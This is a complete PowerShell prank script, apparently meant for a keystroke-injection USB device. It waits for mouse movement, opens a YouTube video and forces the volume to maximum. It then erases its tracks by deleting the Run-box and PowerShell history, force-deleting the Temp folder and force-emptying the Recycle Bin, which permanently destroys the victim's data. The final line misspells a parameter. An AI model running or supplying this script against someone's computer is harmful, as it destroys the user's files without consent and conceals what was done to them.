# Import the System.Windows.Forms assembly
Add-Type -AssemblyName System.Windows.Forms

# Store the original position of the cursor
$originalPOS = [System.Windows.Forms.Cursor]::Position

# Loop until the cursor position changes
while (1) {
    # Check if the cursor position has changed
    if ([Windows.Forms.Cursor]::Position -ne $originalPOS) {
        # If the cursor has moved, exit the loop
        break
    }
}

# At this point, the script will continue executing

# Define the YouTube URL to open
$url = "https://www.youtube.com/watch?v=JBc0h3IVjkc&ab_channel=RaChidASEYAKHEI%D8%B1%D8%B4%D9%8A%D8%AF%D8%A3%D8%B3%D9%8A%D8%A7%D8%AE"

# Open the URL using the default web browser
Start-Process $url

# This turns the volume up to max level
$k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}

# Delete contents of Temp folder 

rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# Delete run box history

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history

Remove-Item (Get-PSreadlineOption).HistorySavePath

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinu

